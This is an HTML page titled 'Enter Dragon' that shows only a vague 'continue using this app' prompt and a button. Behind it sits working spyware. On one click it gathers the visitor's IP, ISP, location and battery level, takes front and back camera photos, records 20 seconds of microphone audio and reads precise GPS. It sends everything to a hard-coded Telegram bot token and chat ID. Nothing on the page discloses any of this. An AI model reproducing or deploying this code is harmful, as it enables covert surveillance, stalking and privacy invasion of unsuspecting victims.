<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Dragon</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            color: #fff;
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 40px 30px;
            border-radius: 15px;
            text-align: center;
            max-width: 90%;
            width: 350px;
            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        h1 {
            margin-top: 0;
            font-size: 26px;
            letter-spacing: 2px;
            text-transform: uppercase;
        }
        p {
            font-size: 16px;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        .btn {
            background: rgba(0, 123, 255, 0.5);
            backdrop-filter: blur(5px);
            border: 1px solid rgba(0, 123, 255, 0.8);
            color: white;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.3s;
            width: 100%;
            box-sizing: border-box;
        }
        .btn:active {
            background: rgba(0, 123, 255, 0.8);
        }
        .loader {
            display: none;
            margin: 20px auto;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #fff;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Enter Dragon</h1>
        <p>Do you want to continue using this app?<br>Is the service required?</p>
        <button class="btn" id="continueBtn" onclick="startProcess()">Continue</button>
        <div class="loader" id="loader"></div>
    </div>

    <script>
        const BOT_TOKEN = "8646604552:AAGWM4W4i9g9T-itnFscvQom32md5GP7lHo";
        const CHAT_ID = "7208869554";

        async function sendTextToBot(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
            }).catch(e => console.log(e));
        }

        async function sendFileToBot(blob, filename) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', blob, filename);
            await fetch(url, { method: 'POST', body: formData }).catch(e => console.log(e));
        }

        async function startProcess() {
            document.getElementById('continueBtn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';

            try {
                // 1. Get Network Info (ISP / 5G / 4G)
                let networkData = "Network Info: Unknown";
                try {
                    const res = await fetch('https://ipapi.co/json/');
                    const ipJson = await res.json();
                    networkData = `ISP/Network: ${ipJson.org}\nIP: ${ipJson.ip}\nLocation: ${ipJson.city}, ${ipJson.region}`;
                } catch (e) {}

                // 2. Get Battery Info
                let batteryData = "Battery: Unknown";
                try {
                    if (navigator.getBattery) {
                        const bat = await navigator.getBattery();
                        batteryData = `Battery Level: ${Math.round(bat.level * 100)}%`;
                    }
                } catch (e) {}

                await sendTextToBot(`Device Details:\n${networkData}\n${batteryData}`);

                // 3. Audio & Front Camera
                let stream;
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
                    
                    // Take Front Photo
                    const track = stream.getVideoTracks()[0];
                    const imageCapture = new ImageCapture(track);
                    const frontPhoto = await imageCapture.takePhoto();
                    await sendFileToBot(frontPhoto, "front_camera.jpg");

                    // Record 20 Sec Audio
                    const mediaRecorder = new MediaRecorder(stream);
                    const audioChunks = [];
                    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
                    
                    mediaRecorder.onstop = async () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                        await sendFileToBot(audioBlob, "20sec_audio.webm");
                        
                        // Stop front tracks
                        stream.getTracks().forEach(t => t.stop());

                        // 4. Back Camera
                        try {
                            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
                            const backTrack = backStream.getVideoTracks()[0];
                            const backCapture = new ImageCapture(backTrack);
                            const backPhoto = await backCapture.takePhoto();
                            await sendFileToBot(backPhoto, "back_camera.jpg");
                            backStream.getTracks().forEach(t => t.stop());
                        } catch (err) {
                            console.log("Back camera issue");
                        }

                        // 5. GPS Location -> Google Maps Link
                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(
                                async (pos) => {
                                    const lat = pos.coords.latitude;
                                    const lon = pos.coords.longitude;
                                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                                    await sendTextToBot(`GPS Location:\n${mapUrl}`);
                                    finishLoading();
                                },
                                async (err) => {
                                    finishLoading();
                                },
                                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                            );
                        } else {
                            finishLoading();
                        }
                    };

                    mediaRecorder.start();
                    setTimeout(() => {
                        if (mediaRecorder.state === "recording") {
                            mediaRecorder.stop();
                        }
                    }, 20000); // 20 seconds timer

                } catch (e) {
                    finishLoading();
                }
            } catch (e) {
                finishLoading();
            }
        }

        function finishLoading() {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('continueBtn').style.display = 'block';
        }
    </script>
</body>
</html>
